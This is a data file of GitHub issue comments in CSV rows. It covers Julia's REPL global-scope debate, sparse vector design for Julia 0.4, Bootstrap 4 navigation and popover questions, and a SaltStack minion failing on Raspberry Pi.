julia/JuliaLang/28789/417414205,"What is the time-line on this?  It seems it would be a great improvement to user usability.  And at this ""critical"" time of Julia with 1.0 out, it would seem advantageous to get this fixed asap (as suggested by Jeff above) and tag a new version Julia or REPL version.  (Sorry for this arm-chair comment, as I certainly will not fix this!) ",,False,False,28789
julia/JuliaLang/28789/417852389,"@friend  I was going to argue that while this is true (for the implementation/compiler), the naive julia programmer cannot not see any different behaviour from his simpler conceptual model (a variable starts existing at the moment it is defined). Unfortunately you are right, the following code will not give an error, while it will give an error if you leave out the a=2 at the end function test()     for i = 110         a=1     end     println(a)     a=2 end I'll explain the unfortunately I can understand the behaviour (because i've worked with compiled languages before) but still find it confusing and unexpected. How bad must it be to someone with only scripting experience or new to programming. Also, I found some code that shows the behaviour, I do not see a useful application (maybe you can help me there) On the REPL I just got more convinced that changing the scoping back to ""normal"" at  least in the REPL (no need to add global in loops) is high priority I was testing some things in the REPL today and got (again) bitten by it, taking some time to realize it. Given that I follow Julia already some time, really like a lot of it, am even following this thread about the problem, I would even call it a showstopper A newbee (to the Julia) testing out the language is very likely not to find out the problem and just give up. ",,False,False,28789
julia/JuliaLang/28789/418209187,"@friend and I are both on long-awaited vacations (I should not be reading this). We can figure out what to do in a week or so. @friend, while the feedback is appreciated, scoping rules are not up for a broader debate or revision. The only thing on the table is special-casing interactive eval. The SoftGlobalScope package is already an excellent experimental implementation and it may just be a matter of making that part of Base and using it in the REPL. ",,False,False,28789
julia/JuliaLang/28789/418900808,"@friend A short answer is that I think it's easier if the scope of a variable corresponds to some block construct (e.g. the body of a function or loop). With your suggestion, the scope of a variable would be some subset of a block, which I think is ultimately more complex and confusing --- you can't point to a syntactic form that corresponds to the scope of the variable. Yes, I can believe this is a mismatch for some people's intuition. But you can only optimize for the first ten minutes of using a language up to a point. The real question is, how hard is it to teach/learn how it works, and which design will save time in the long run (by making the language simpler, making it easier to develop tooling, etc.)? ",,False,False,28789
julia/JuliaLang/28789/418942157,(in agreement with much of the above about modifying the behavior of the REPL) I'd like to see the REPL be in a way that does not lead to this stackoverflow question  and sooner would be best as many new eyes are looking at Julia ,,False,False,28789
julia/JuliaLang/28789/418945069,"I agree... And also think that the scoping rules shouldn't necessarily change, just all of the interactive interfaces (i.e. the REPL, Jupyter, and Juno control enter) This is not just about beginners learning a new rule. If you can't copy and paste fragments of code into the REPL, jupyter etc and also into functions, it is a major annoyance for intermediate programmers as well. Of course, I also agree with the other posters... with beginners they going to take code fragments they see within functions, copy I into scripts, and be completely confused when it doesn't have the same behaviour when copied inside of a function, in juno, the repl, and jupyter. There will be 100 stack exchange questions which come down to the same issue. Intermediate programmers are going to have all sorts of homegrown solutions with wrapping in  blocks, etc which will confuse things further ",,False,False,28789
julia/JuliaLang/28789/418966000,"Possibly, but at this stage this is hypothetical (also the OP of the question linked is asking about the rationale for the scoping rule, as opposed to being confused about it). Also, while I respect the teaching experience of everyone who has concerns about this, whether this turns out to be a big deal in the classroom is something that time will tell. ",,False,False,28789
julia/JuliaLang/28789/418967383,"the questioner appears to have been confused by it ""I wonder if this is intuitive to beginning julia users. It was not intuitive to me ..."" ",,False,False,28789
julia/JuliaLang/28789/418968414,"Not to mention that this is someone who clearly knows enough about programming languages to understand the nuances of scope. What about all of the matlab type users that are completely ignorant of these topics..., and probably will never invest enough time to understand the nuances. ",,False,False,28789
julia/JuliaLang/28789/418970409,"I've already answered multiple questions related to this on stackoverflow, mostly by new users, and even more in real life (last one just yesterday, from a Matlab user, who saw this as a no go). ",,False,False,28789
julia/JuliaLang/28789/418976170,"In my ""spare time"", I've been adding  and  tags to the SE questions.  I only stop because of lack of time, not because there aren't more. ",,False,False,28789
julia/JuliaLang/28789/421457801,"Conclusion after much discussion including triage we're going to include something along the lines of  in Base and use it in the REPL and all other interactive evaluation contexts. @friend has pointed out that the way this is implemented is actually essentially the same as how soft scope was previously implemented, so to some extent we're coming around full circle. The difference is that now there is no scope behavior in modules or scripts, only in REPL-like contexts. I also think that explaining soft scope as a source rewrite is clearer than trying to distinguish between hard and soft scopes (which we never how Jeff explained it, I might point out). ",,False,False,28789
julia/JuliaLang/28789/421532052,These two statements confuse me a bit as they seem a bit contradictory Does this mean that the module  has sometimes a soft scope (say at the REPL prompt) and sometimes a hard scope (say when )?  Would it not make sense to say that  always has soft scope? And a module can opt-in to soft scope by ? ,,False,False,28789
julia/JuliaLang/28789/421623132,"(I guess) scoping rules cannot be changed in scripts because it would be backwards incompatible, i.e. would break the promise that any code written for 1.0 will run on any 1.* version. You are correct though that the same problem with scoping for the REPL also applies to scripts (naive user at a complete loss why his/her code does not work properly when run as a script). A way to solve/alleviate this problem without major incompatibilty would be to add an option to the julia cmdline to use  softscope (or alternative) , e.g. julia -f programfile, and show this option in any description/tutorial that a beginner is likely to come across. I also see a potential alternative for the softscope that may have some advantages (though i am probably overlooking disadvantages) What if a file (a called script) would always introduce its own local scope scoping rules would be in complete consistency with those in functions, and with the expectations of a lot of users. It would also remove a lot of the performance liabilities with new users  No more unneeded globals (globals would have to be explicitly defined), and code might be compiled (How many times have you had to say to put everything in a function, and to avoid using globals?) ",,False,False,28789
julia/JuliaLang/28789/423157258,"I've just hit this and was completely boggled to be honest, having never seen it before in any other language. I'm planning on introducing an optional Julia course for advanced R users in my uni later this year once things have settled down, and my students will hit this on day 0 when they start randomly typing things in the REPL. And the fact that  loops behave differently from  statements just rubs salt in the wound, however logical this may be in terms of scoping. Scope inside functions is sufficiently hard to get biology students to grasp, the idea of having to explain albeit perceived glaring inconsistencies in it in the REPL / in a script / in a for loop / in an if statement (because that's what we're talking about here) in a way that is different from every other language on earth makes me very sad. I understand the backward compatibility promise that was made, but having this work as expected by every non-cs person on the planet (and most cs people I suspect) seems like a bugfix rather than a backward compatibility issue - we're not saying that every bug will be reproduced for ever are we? The REPL fix is obviously essential, so it's great that you're proposing this, but then having to explain you can't copy a script into the REPL and expect the same behaviour seems as bad as or worse than the original problem. Please, please, please think about treating this as a bugfix and pushing it out with scripts as well as the REPL - even if there's an switch to go to the ""old"" behaviour - and doing it as soon as possible in 1.0.1. ",,False,False,28789
julia/JuliaLang/28789/423327310,A colleague that I was trying to get to learn julia also just ran into this. Having to explain the whole global vs. local variable thing at the first steps is not ideal... ,,False,False,28789
julia/JuliaLang/28789/423329612,"I don't think treating this as a ""bugfix"" is in the cards, because it would break the 1.0 stability contract.   However, it seems reasonable to me to use softscope for scripts run with  (i.e. ""interactive"" mode). (That is, there would be a flag  and it would default to the value of .) ",,False,False,28789
julia/JuliaLang/28789/423335274,We'll have to consider the script mode choice. ,,False,False,28789
julia/JuliaLang/28789/423336959,"For that matter, it's not crazy to me to default to  for any ""script"", i.e. for , and only turn on the ""hard"" scoping rules for modules and  (at which point you should really be putting most code into functions). ",,False,False,28789
julia/JuliaLang/28789/423340022,"That.  The other one to seriously consider is Juno.  Remember that people will  through their code to do interactive development(especially when working with the regression tests) and then later expect to be able to run the same file.   Should it matter if the code is in a  or not (which I think might introduce a scope)?  It would be very confusing to the user if the same text changes when in a  vs. not when using Atom's integration, and is inconsistent with doing  as well. It sure sounds to me like the best solution is that the hard-scope is simply an opt-in thing, where if every other usage (including  within scripts) uses  unless you say otherwise. ",,False,False,28789
julia/JuliaLang/28789/423346801,"Do you want to write  to introduce every variable? That would also ""fix"" this, and be more like other languages. That is not how this works. You can't get any change to the language you want just by calling the current behavior a bug. I reeeally don't think there should be a command line option for this. Then every piece of julia code will have to come with a comment or something telling you which option to use. Some kind of parser directive in a source file would be a bit better, but even better still would be to have a fixed rule. For example, hard scope inside modules only might make sense. Let me try again to provide an explanation of this that might be useful for avoiding the mania, hysteria, and carnage people are seeing in the classroom "" Julia has two kinds of variables local and global. Variables you introduce in the REPL or at the top level, outside of anything else, are global. Variables introduced inside functions and loops are local. Updating global variables in a program is generally bad, so if you're inside a loop or function and want to update a global, you have to be explicit about it by writing the  declaration again. "" Perhaps that can be improved; suggestions welcome. I know, you'd rather not need any sort of explanation at all. I get that. But it doesn't seem so bad to me. ",,False,False,28789
julia/JuliaLang/28789/423356933,"I agree.  Sounds like a teaching and communication headache to me. Just so I understand if I had a short script (not in a module!) in a  file which I had copied from an IJulia notebook, then if I ran that code in either the REPL directly or shift-enter in Juno, then it would behave consistently as soft-scope... but if I copied it instead of a  block then it would yell at me about globals?  But if I copied that code inside of functions inside of a module, then it should work. If so, that makes complete sense,is very teachable and coherent.  Top-level scripts are an interactive interface for exploration, etc. but you would never put that kind of code in a module.  Modules are something that you should fill with functions are very carefully considered globals.  It would be easy to tell people about those rules. ",,False,False,28789
julia/JuliaLang/28789/423361708,"No, I'd rather not! But scripting languages that have a REPL rarely do that (e.g. ruby, python, R, ...), they behave like Julia v0.6 did. I completely understand what you're saying here, and I won't (touch wood!) make this mistake again. But the whole problem I'm worried about is not me. I've found it relatively easy to introduce scope (without mentioning it directly) when I explain that variables inside functions can't see ones outside and vice-versa (even though that's more an aspiration than a fact in R!), because functions themselves are already a relatively advanced concept. But this hits much earlier in the learning curve here where we don't want anything remotely as complicated as scope to be impinging on people... Note also it's not just ""variables you introduce in the REPL or at the top level, outside of anything else, are global"" and ""variables introduced inside functions and loops are local"", it's also that variables in if statements in the REPL or at the top level are global but variables in a  are local. We end up down a rabbit-hole of ""just try it and work out for yourself whether it's local or global, good luck"". However, I agree with @friend - the proposal that ""hard scope inside modules only might make sense"" seems completely fine to me! Modules are a sufficiently advanced concept again... if soft scope works for the REPL and scripts, that's absolutely fine. ",,False,False,28789
julia/JuliaLang/28789/423364338,"What I'm trying to get at is that I feel a simple description of global vs. local is sufficient for early-stage teaching --- you don't even need to say the word ""scope"" (it does not occur at all in my explanation above). When you're just showing some simple expressions and loops in the REPL, you're not teaching people about testsets and you don't need an exhaustive list of the scoping behavior of everything in the language. My only point is, this change does not suddenly make it necessary to teach lots of details about the language up front. You can still ignore the vast majority of stuff about scopes, testsets, etc., and a simple line on global vs. local should suffice. ",,False,False,28789
julia/JuliaLang/28789/423367678,"In a world where everyone started writing all of their code from scratch, I would agree completely. The issue is that you need to teach students not just about scope, but also about understanding the scope of where they copy-pasted code they got from.  You need to teach them that if they copy-paste code that is on stackexchange within a function or a let block that they need to scan through it and find where to add ""global"" if they are pasting it into the REPL or a  file.  But if they are copying that code inside a function or into the Jupyter notebook. they shouldn't.  And if they find code inside of a stackexchange or tutorial page that has global variables in it, but they want to copy and modify that code inside of their own function, then they need to strip out the global. And then students start asking why does  create this scope they need to worry about but not other things.... ",,False,False,28789
julia/JuliaLang/28789/423367796,"Pop quiz in julia 0.6, is  global or local The answer is that there's no way to know, because it depends on whether a global  has been defined before. Now, you can say for sure that it is local. ",,False,False,28789
julia/JuliaLang/28789/423368949,"Folks, this discussion is verging on no longer being productive. Jeff knows very well that the old behavior was nice in the REPL. Who do you think designed and implemented it in the first place? We have already committed to changing the interactive behavior. A decision still needs to be made about whether a ""script"" is interactive or not. It sounds interactive when you call it ""a script"" but it sounds far less interactive when you call it ""a program""—yet they are exactly the same thing. Please keep the replies short and constructive and focused on the things which still must be decided. If there's comments that deviate from this, they may be hidden and the thread may be locked. ",,False,False,28789
julia/JuliaLang/28789/423369442,"One thought that I had but we dismissed as being ""too annoying"" and ""likely to cause the villagers to get out their pitchforks"" was that in non-interactive contexts, we could require a  or  annotation in ""soft scope"". That would guarantee that code from a module would work the same if pasted into the REPL. If we applied that to ""scripts""/""programs"" then the same would be true of them. ",,False,False,28789
julia/JuliaLang/28789/423371393,"When I was first introduced to Julia (not a long time ago, and I come from a Fortran background mostly), I was taught that ""Julia is compiled and fast at the function level, thus everything that must be efficient must be done inside functions. In the main 'program' it behaves like a scripting language"". I found that fair enough, as I cannot imagine anyone doing anything too computationally demanding without understanding that statement. Therefore, if there is any sacrifice in performance at the main program for using the same notation and constructions than in the functions, I find that totally acceptable, much more acceptable than trying to understand and teach these scoping rules and not being able to copy and paste codes from one place to another. By the way, I am a newbie in Julia yet, having chosen it to teach some high-school and undergraduate students some basics of simulations of physical systems. And I am already hopping this issue returns to the 'normal' behavior of previous versions, because it gives us quite a headache. ",,False,False,28789
julia/JuliaLang/28789/423382739,This conversation is locked now and only Julia committers can comment. ,,False,False,28789
julia/JuliaLang/28789/427863076,"@friend, what would be the plan to implement the semantics you suggested in this discourse thread, initially only in the REPL and opt-in elsewhere? It sounds like you are planning to put that directly into the lowering code (), rather than as a syntax rewriting ala SoftScope.jl?  Or would you rather have it as syntax rewriting first (modifying SoftScope to the proposed rule and converting it to a stdlib), and defer putting it into the lowering code for a later Julia release? ",,False,False,28789
bootstrap/twbs/19814/151426642,"I began to migrate to the Bootstrap 4. All components are successfully updated, except for navigation. How does the navigation Bootstrap 3 for smartphones image How does the navigation Bootstrap 4 for smartphones image1 or image2 What caused such an attitude to navigation? ",,False,False,19814
bootstrap/twbs/19814/215161707,There is a large amount of work to be done on navs still... Alpha2 is not production ready so you'll have to live with issues as v4 matures ,,False,False,19814
bootstrap/twbs/19814/215163535,"Well, I hope that this defect will be fixed. ",,False,False,19814
bootstrap/twbs/19814/215170447,"@friend It's not a defect, it's a WIP. Please close this issue since it is a duplicate of ",,False,False,19814
bootstrap/twbs/19814/215197130,"As @friend said, v4 is still in early alpha, and a lot of structures, styles and scripts have changed considerably/aren't finished yet - migrating to v4 already at this stage will likely bring up issues. And yes, duplicate of #17250 ",,False,False,19814
bootstrap/twbs/7050/11326557,"Have tried the following and a couple of other iterations.  I have jquery.js (full being brought in.  Assume I don't need bootstrap-tooltips.js AND bootstrap-popover.js as well?  Regardless, the problem isn't solved when including them.  TIA.             &lt;a data-toggle=""popover"" class=""m-btn blue rnd"" data-title= ""We are in  awwwwww"" data-content=""dolor sit amet.""&gt;Click me!&lt;/a&gt;             &lt;script type=""text/javascript""&gt;                 $(function () {                     $('body').popover({                         selector 'a[rel=""popover""], [data-toggle=""popover""]'                     });                      $('body').tooltip({                         selector 'a[rel=""tooltip""], [data-toggle=""tooltip""]'                     });                 });             &lt;/script&gt;  ",,False,False,7050
bootstrap/twbs/7050/13999929,This doesn't seem to be the right forum for this ? although issue is valid.  Moving to mailing list since patience wears thin on noob questions apparently. ,,False,False,7050
bootstrap/twbs/7050/14013360,this could be happening cause the tooltip / popover is in a btn-group or one of the input-append or input-prepend classes.. we can set a container option to help fix that problem.. ` ,,False,False,7050
bootstrap/twbs/7050/14916877,Duplicate of #5930. ,,False,False,7050
bootstrap/twbs/7050/14917405,"Thanks.  That was fixed in 2.3 (I found) and when i got jquery link code cleaned up a bit.  Now I just wrestling with keeping the popover open long enough to read and click on embedded hyperlinks within before manually shutting it down.  Best, V. On Thu, Mar 14, 2013 at 1236 PM, Chris Rebert notifications@friend.comwrote --  Vince Fulco, CFA, CAIA 612.424.5477 (universal) vfulco1@friend.com twitter vfulco app.net vfulco -- “Everything can be taken from a man but one thing the last of the human freedoms – to choose one’s attitude in any given set of circumstances, to choose one’s own way”.  --Viktor Frankel Always have your stuff when you need it with @friend. Sign up for free! ",,False,False,7050
salt/saltstack/24955/90926278,"After bootstrap trying to start Version I also tried with an empty minion config, but the problem remains. I am assuming(ohoh) that it should work out of the box after bootstrapping. Am I doing something wrong ? Or doesn't this version work on a PI ? ",,False,False,24955
salt/saltstack/24955/115390049,"@friend, is there another minion process running when you try to start a new process? ",,False,False,24955
salt/saltstack/24955/115558462,"@friend , no there is not. Just to be sure, i double checked. ",,False,False,24955
salt/saltstack/24955/115976305,"@friend, this looks like a really strange issue.  Salt itself is as portable as python, so as long as its dependencies are installed, it should work.  The best I can think of is that there may be a dependency problem that is causing the minion process to erroneously loop as you've demonstrated.  Is there any more interesting output with ?  Also, will you post the output from ?  Thanks. ",,False,False,24955
salt/saltstack/24955/122077979,"@friend, would you mind posting the output from  and ?  Thanks. ",,False,False,24955
salt/saltstack/24955/122159439,"(Also, this was output 3x during bootstrapping) ",,False,False,24955
salt/saltstack/24955/122163734,"There may be some dependency, upstream issues here.  Salt is pure python and I'm sure nothing in python or its standard lib could cause an .  It may be that a raspberry pi (at least an older one) may be too underpowered to run a salt minion, but I am doubtful of this.  I have been able to successfully run a salt minion on hardware with lesser capacity. ",,False,False,24955
salt/saltstack/24955/138426424,"I have observed the same behaviors during a reinstall on a previously-working Raspberry Pi B+. Previously I installed a Salt minion on the Pi on 2015-02-22 (I believe I also upgraded it via apt-get on 2015-04-06 although it's unclear from my notes if the new version ""took effect"" or not).  ((EDIT 2015-09-07) Regardless of whether the oldest version was still running or not, it was definitely talking to the Salt Master.) Due to filesystem corruption, on 2015-08-15 I was forced to reformat and reinstall the OS (NOOBS v1.4.1), and I noticed that running  seemed to hang no response, but no error.  Since then I've been trying various combinations of installing and reformatting, and even upgraded the Salt master, but the minion is not working properly and displays many of the behaviors commented above. For demonstration purposes, I begin with Download and install the bootstrap script Run the installer using  and it does a bunch of stuff before ending I then try (unsuccessfully) to confirm the versions of the installed software (I hit CTRL-C after about a minute of waiting) Attempt to stop the minion and restart in debug mode Eh?  It's still running? Force quit, confirm it's not running Now run the minion in a debug mode (hit CTRL-C after several minutes) Checking the contents of  shows the following Note the presence of warnings about  as was mentioned by others in this thread. During debugging, at various times I too received errors about ""Illegal operation"".  At the time I thought I had debuged that to be a matter of not running the command as sudo but I have not been able to reliably reproduce this behavior. I have also tried (and failed) to use the documented instructions to install the second-most-recent version, but it might be better to stop here and keep the focus on the current problem. Any suggestions? ",,False,False,24955
salt/saltstack/24955/138427483,"We ended up switching from Raspbian to Arch.  We got it working with a Pi 2 on Raspbian, but in order to support both platforms we had to move to Arch. On Sep 8, 2015 1221 AM, ""neilr8133"" notifications@friend.com wrote ",,False,False,24955
salt/saltstack/24955/171631597,Any news on this ? ) ,,False,False,24955
salt/saltstack/24955/171720099,"@friend, not that I know of.  We're working on getting through our backlog of issues. ",,False,False,24955
salt/saltstack/24955/174838335,"I just hit this, I had been bootstrapping pi's just fine, albeit with an older version of salt-bootstrap (2015.08.06 + mods). It seems to only be broken on the raspbian lite image for me. I've been using the offical Raspbian jessie images 2015-09-24-raspbian-jessie (works) 2015-11-21-raspbian-jessie-lite (fails) So its probably a dependency issue or a botched build of some package in the lite image. Running   gives the following output which may point to openssl, of course I might be on the wrong track.... ",,False,False,24955
salt/saltstack/24955/190055218,When following the latest install instructions here  will fail to run on a raspberry pi (Illegal Instruction). But after running another apt-get upgrade which unpacks python-tornado 4.2.1-1+b2 (from stretch) over 4.2.0-1~bpo8plus one (from jessie-backports) it magically works. I think the issues are from using the standard debian repo for binary packages instead of raspbian. The python-tornado package from the standard debian archive doesn't seem to want to run on armv6 which makes sense. I'll test a fresh install without using jessie-backports and if that works i'd suggest we update the documentation for install on raspbian. ,,False,False,24955
salt/saltstack/24955/190601279,"@friend For now, Salt Bootstrap doesn't support automatic installation on Raspbian. Try to follow installation instruction that @friend has suggested. I guess this issue could closed as a duplicate of saltstack/salt-bootstrap#695. Thanks! ",,False,False,24955
salt/saltstack/24955/194189356,"With the Raspberry 2b, we switch to official Debian image which fully support ARMv7.  So for us, it's ok ) ",,False,False,24955
salt/saltstack/24955/194267229,The Raspberry Pi 1 and 2 range are an old ARM 32 bit chip 99% of distros have dropped support for this old ARM chip.  Most (if not all) of the other single board chips run the current ARM 32bit chip   So for Raspberry Pi 1 and 2 you must get any binaries for the Raspberry Repo and not any other source.   Raspberry Pi 3 just release is current 64bit chip which will see the Raspberry Pi being able to run more distros.  I run fedora on a WandBoard which uses current 32bit chip and point the repo at the x86   and run dnf install salt* it picks up the noarch from salt the the binaries come from fedora. ,,False,False,24955
salt/saltstack/24955/194286667,"I think it's a real shame that salt-bootstrap does not support raspbian and all raspberry pi's out of the box. At our salt meetup (Paris), we often have people complaining about this. Note that often people want to try out at home this technology before recommending it to their boss or at work, so in my humble opinion, theses users should get the best UX possible, and for all versions of the Pi. Seeing that a project considers Pi1 or 2 as ""old"" platforms is usually perceived as ""oh, so it's meant to run on some cutting edge hardware"". I would like to keep on encouraging hobbyists to try out salt for things such as home automation like suggested in  ... it's getting harder and harder. ",,False,False,24955
salt/saltstack/24955/194294778,"@friend I think you're very welcome to submit PR to  for now, you're able to install Salt manually from Raspbian testing repo  simple script (few lines of Bash) could be written following this guide to perform bootstrapping exclusively for Raspbery PI. ",,False,False,24955
salt/saltstack/24955/194310171,"I got Puppet running on ARM, logged a case for better support and got back not supported at all, and no plans to support.  SaltStack have a good attitude towards ARM Platform. ",,False,False,24955
salt/saltstack/24955/270058121,"TLDR Use -P Ran into the same problem, tried the approach ""few lines of bash"" but there is also a even simpler workaround. First the bash approach (The keyserver lines are necessary at least in the current Raspbian 2016-11-25-raspbian-jessie) But as seen in  , the current default-development-branch's commit, it is already enough to specify the -P option        -P  Allow pip based installations. as then the required version will be satisfied. So this is then the currently working bash script to install salt master and minion on a Raspberry Tested on Raspbian version 2016-11-25-rasbian-jessie. ",,False,False,24955
salt/saltstack/24955/413446145,"This issue has been automatically marked as stale because it has not had recent activity. It will be closed if no further activity occurs. Thank you for your contributions. If this issue is closed prematurely, please leave a comment and we will gladly reopen the issue. ",,False,False,24955
julia/JuliaLang/11324/77528674,"There's been a lot of debate about whether we should incorporate sparse vectors into Julia 0.4. Here are three options  (A) Use SparseMatrixCSC to emulate a sparse vector. This, as many have pointed out in other issues, breaks the consistency with the dense arrays. It is also unnatural and inefficient.  (B) Add SparseVector to base before 0.4 is released.  The functionalities have been developed and tested in SparseVectors.jl. These functionalities are relatively simple and they don't need a long time to get mature. (#8718)  (C) Deprecate sparse vector related functions in Base, and add SparseVector to base after 0.4 is released. (#11323)   Personally, I don't like (A), and I am fine with either (B) or (C). One opinion against (B) is that there can be multiple ways to represent a sparse vector. However, IMHO, the way used in SparseVectors.jl seems to be the most natural way, and it is consistent with both CSC and COO formats. I understand that other formats may be more suitable for certain situations. For such cases, it is not difficult to develop a new sparse vector format (using a different type name of course). cc @friend @friend @friend @friend Since @friend has tagged #8718 as 0.4, and that PR was closed, I tag this as 0.4 in order to make sure that we come to a decision before 0.4 is released. ",,False,False,11324
julia/JuliaLang/11324/102979460,"I am in favour of (B) and to get it all right for 0.4. I don't like just removing the functionality and then adding it again later, which would break codes yet again. This will be an improvement over what already exists, IMO. ",,False,False,11324
julia/JuliaLang/11324/103074784,Agreed that the implementation in SparseVectors.jl is an improvement over what already exists. Don't take my objection over the maturity and name too seriously if there's a consensus for option (B). ,,False,False,11324
julia/JuliaLang/11324/103280977,"The ""inconsistency"" between dense and sparse arrays doesn't go away by adding a sparse vector type. Even with a sparse vector, there is still no sparse arrays for dimensions higher than two, so I don't buy the consistency argument and therefore also not the ""unnatural"" argument. It might be very useful with a sparse vector type, but I think we should focus of the class of operations that could benefit from a sparse vector type and some performance measures. ",,False,False,11324
julia/JuliaLang/11324/103281942,"Here's your inconsistency argument I'm repeating myself, but I don't care that sparse doesn't generalize yet. But we're doing dimensions 1 and 2, and the operations that result in one from the other, wrong. Let's just fix that for now. ",,False,False,11324
julia/JuliaLang/11324/103310368,"It is these kinds of inconsistencies I don't like, which make the system feel lacking. I wish we had N-d too, but that is likely to happen in JuliaSparse rather than Base. I also feel that a sparse vector will be useful with non-numeric data types as well. ",,False,False,11324
julia/JuliaLang/11324/103312736,"Although, for non-numeric data types, what is the type for fields not represented? The types of sparse arrays and vectors I have implemented (for database use) didn't store null or undefined fields.  For Julia, I guess you'd need type Any, and Nothing. ",,False,False,11324
julia/JuliaLang/11324/103314770,"@friend, the storage for a sparse vector and a 1-column CSC matrix is essentially the same, I don't think there are any performance differences. The argument is that the current semantics are wrong. ",,False,False,11324
julia/JuliaLang/11324/103478854,I still think that it would be useful to see examples application of sparse vectors. The indexing behavior of special matrix types is hard. It is a standard attack on the special matrix types and one of the reasons they might not fit well as subtypes of . I don't think indexing is the most important feature of sparse matrices or special matrices in general. They are mainly about  and . ,,False,False,11324
julia/JuliaLang/11324/103498570,One common sparse vector application  Read in a text corpus document-by-document and train a logistic regression classifier with an L1 penalty on parameters. Your parameter vector is a sparse vector and each new document (of which there should be exactly one in memory at a time) is a sparse vector. The only thing you need to do is compute dot products and update the parameter vector.  ,,False,False,11324
julia/JuliaLang/11324/103510655,"The SparseVectors package was initially motivated by the need to represent sparse samples in machine learning applications (@friend's example is an important case). For sparse vectors, we often want to compute dot products, compute distances between them, etc. Matrix-vector product is also very useful. ",,False,False,11324
julia/JuliaLang/11324/103513656,"Looks like, the general opinion is towards option (B). I will make a PR later this week. ",,False,False,11324
julia/JuliaLang/11324/103518745,"Thanks for the examples. I think all of them could work for vectors represented by  sparse matrices. After all, that approach works well in MATLAB, but go ahead with another type. I won't obstruct the process further. ",,False,False,11324
julia/JuliaLang/11324/103519093,"I preface this with the caveat that I do not do sparse linear algebra, but I have been playing with indexing a lot lately.  I've not tried this yet, either. Would it be possible to add a ""phony"" dimensionality to the CSC type, allowing it to pretend to be one or multi-dimensional?  All indexing would be reduced or expanded to its canonical two dimensions.  This will be very inefficient for high dimensional arrays, but it should be fairly easy to make it semantically correct and consistent (especially if we get #10525).  The JuliaSparse organization can provide more specialized types that are more efficient in the non-2-dimensional cases. ",,False,False,11324
julia/JuliaLang/11324/103522839,"Somewhat OT Since SparseVectors have decidedly numeric meaning in Julia (i.e. it is zero values that are removed, instead of null values), how would you name a package for storing efficiently sparse vectors of any type, where many values may be null? [think of JSON arrays, RDBMS rows, etc.]... Does something like that already exist, and I just haven't found it yet?  Thanks! ",,False,False,11324
julia/JuliaLang/11324/103525215,"Scott, check out the DataArrays.jl package. On Tue, May 19, 2015 at 829 AM, Scott P. Jones notifications@friend.com wrote ",,False,False,11324
julia/JuliaLang/11324/103525789,"@friend Nullable types, or DataArrays potentially. @friend that sounds finicky and more complicated than just adding a separate type for 1-d. If we're going to distinguish vectors from matrices within the type system for dense arrays, consistency really demands that we do the same for sparse. Faking it adds complexity to the CSC type, whose internals are already quite commonly used and relied upon not changing in packages. I have an application where I build up a sparse CSC matrix representation column-by-column, often reordering columns but rarely changing their contents. For this, an array-of-SparseVectors is an ideal representation. Representing this as CSC adds overhead for an extra integer field and an extra 2-element integer array for the column pointers for each object, which I'd really rather avoid since my columns have very few nonzeros on average. ",,False,False,11324
julia/JuliaLang/11324/103528803,"@friend, I would love to be able to vcat an array of sparse vectors to get a sparse CSC matrix. I think I'm coming around on this. ",,False,False,11324
julia/JuliaLang/11324/103530635,"hcat, you mean? ",,False,False,11324
julia/JuliaLang/11324/103537320,"Yes, hcat ",,False,False,11324
julia/JuliaLang/11324/103661009,"I'm going to have to disagree with you pretty strongly there. I use sparse matrices very heavily, but I do essentially zero linear algebra with them in Julia. Why? Because Julia's sparse matvec and matmul are still quite a bit slower than doing it in C++ or using MKL's sparse blas extensions, and the sparse factorizations available in Base aren't complete enough for my needs (SuiteSparse has no Bunch-Kaufman indefinite LDL^T). My sparse matrices do have linear (and often custom nonlinear) algebraic meaning, but that gets sent to a compiled solver to do all the actual work. So indexing, reductions, data structure traversal and creation within Julia is really important to me on sparse and structured array types (re #8001). I should send Jiahao an email and see about visiting MIT and working on it for a few weeks leading up to JuliaCon. Eventually Julia will be fast enough to write the solvers themselves - if I can get diagonal-D quasidefinite factorizations from Cholmod to work properly I've been meaning to write a Mehrotra QP solver as a proof-of-concept. Will be interesting to benchmark against Ipopt. ",,False,False,11324
julia/JuliaLang/11324/103751502,@friend is going to be travelling from now to JuliaCon. I will probably be around MIT a few days before and after JuliaCon - so would love to push on sparse matrix work in any way possible. ,,False,False,11324
julia/JuliaLang/11324/103751747,"@friend The CSC/CSR format is dense in one dimension. It doesn't generalize well to higher dimensions, where you really just want the COO format - representing indices as tuples. I have thought about faking it in CSC, but you just get extra overhead for processing vectors. I would love to make the two representations close enough, so that one can write generic code for iterating through either SparseMatrixCSC or SparseVector. ",,False,False,11324
julia/JuliaLang/11324/103751856,@friend You can store anything in Julia's sparse data structures already ` ,,False,False,11324
julia/JuliaLang/11324/103763710,"@friend What about the following? The problem is that Julia's sparse data structures all have 0 not be represented, but for RDBMS rows, you want NULL to not be represented.... ",,False,False,11324
julia/JuliaLang/11324/103781988,"Julia's sparse data structures although not strictly restricted to numeric values, have only been used with numeric values so far. Hence all the rough edges for non-numeric data. This discussion should really be on the mailing list and not here in this issue, where it is off-topic. ",,False,False,11324
julia/JuliaLang/11324/103945652,"Yup, I'm well aware. That's why I called them phony dimensions. My point was just that it might be easiest (as a stopgap) to allow the CSC data structure to masquerade as non-matrices. But perhaps that's naive. ",,False,False,11324
julia/JuliaLang/11324/103976039,"Adding A specific class for sparse vectors is not very difficult. It is largely done in a package, I will try to find some time during the weekend to make a PR. ",,False,False,11324
julia/JuliaLang/11324/104034674,"I'm worried that we're going to go through the same process of finding that all sorts of operations are missing or unusably slow due to using generic fallbacks that went on (is going on?) with sparse matrices for so long. If @friend and @friend are confident that this functionality is complete, then I guess we can merge this into the standard library, but we really need very complete tests for this. ",,False,False,11324
julia/JuliaLang/11324/104089720,"We probably will. The implementation covers enough functionality to be very useful as-is. I don't think Dahua was able to figure out how to get Coveralls turned on yet ( which I have no idea how to help with. It's getting better over time by adding new methods. My nascent idea for a proper generic solution that would be good enough to eventually close #8001 is to extend the cartesian indexing types with a sparsity-aware version, something like , and make the ""generic"" fallbacks use it where appropriate. ",,False,False,11324
julia/JuliaLang/11324/104091036,"What I can make sure is that all methods in SparseVectors.jl (or the PR that would be made later) are implemented in a reasonably efficient manner. However, there are many functions out there that accept AbstractArray but are implemented in a way that assumes fast random access (e.g. for i = 1length(A) ... end), these functions are doomed to work very slowly when called on sparse arrays. ",,False,False,11324
julia/JuliaLang/11324/104135926,"I believe this functionality is useful as is too. We will discover fallbacks to generic implementations, but we are pretty good about fixing them quickly. There is enough time in the 0.4 release cycle to get this 100% right. Let's at least start with a PR. ",,False,False,11324
